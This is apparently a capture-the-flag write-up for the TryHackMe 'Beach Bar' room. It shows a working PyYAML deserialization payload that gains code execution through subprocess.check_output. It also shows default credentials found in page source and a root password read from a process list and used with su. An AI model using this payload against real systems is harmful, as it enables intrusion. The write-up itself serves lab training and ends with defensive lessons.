# TryHackMe – Beach Bar (Hacker Holidays)

## Objective

* Obtain the **user** flag
* Obtain the **root** flag

## Enumeration

I began by performing a standard enumeration:

```bash
nmap -sC -sV <TARGET_IP>
```

The scan revealed an HTTP service hosting a login page. Directory enumeration with Gobuster identified several endpoints:

* `/login`
* `/dashboard`
* `/export`
* `/import`
* `/logout`

Inspecting the login page source revealed a developer comment containing default credentials:

```text
dj / dj
```

Using these credentials granted access to the application dashboard.

---

## Initial Access

The dashboard allowed exporting and importing playlists in **YAML** format.

Exporting a playlist produced a standard YAML file, while the import page accepted either pasted YAML or uploaded `.yml` files.

Given the application was running on **Gunicorn (Python)**, I suspected unsafe YAML deserialization.

Testing with a Python object payload confirmed remote code execution:

```yaml
playlist:
  name: !!python/object/apply:subprocess.check_output
    args:
      - ["id"]
    kwds:
      text: true
```

The server executed the command and returned:

```text
uid=1001(bartender)
```

This confirmed arbitrary command execution as the **bartender** user.

---

## User Enumeration

Using the same technique, I gathered information about the host:

* Current user: `bartender`
* Working directory: `/opt/beach-bar/webapp`
* Application source code located in `app.py`

Reviewing the source code revealed the vulnerable function:

```python
parsed = yaml.load(content, Loader=yaml.Loader)
```

The application used `yaml.Loader` instead of `yaml.safe_load()`, allowing arbitrary Python object execution.

I then located and read the user flag from:

```text
/home/bartender/user.txt
```

---

## Privilege Escalation

After obtaining an interactive shell, standard privilege escalation enumeration (`sudo -l`, SUID binaries, Linux capabilities) did not reveal an obvious path.

Further investigation identified another application component:

```text
/opt/beach-bar/jukeboxd/jukeboxd.py
```

Listing running processes exposed a sensitive command-line argument:

```text
/opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass SunsetSpritz2024!
```

The daemon was running as **root**, exposing its password via the process list.

Using:

```bash
su -
```

and supplying the exposed password successfully granted a root shell.

The root flag was then obtained from:

```text
/root/root.txt
```

---

# Key Takeaways

* Always inspect HTML source for developer comments and exposed information.
* Unsafe YAML deserialization (`yaml.load`) can lead to Remote Code Execution.
* Reading application source code often reveals the intended attack path.
* Process command-line arguments may expose sensitive credentials.
* Structured enumeration is often more effective than relying solely on automated exploitation.

## Skills Practised

* Web Enumeration
* Burp Suite
* Source Code Review
* YAML Deserialization
* Remote Code Execution
* Linux Enumeration
* Privilege Escalation
* Credential Discovery
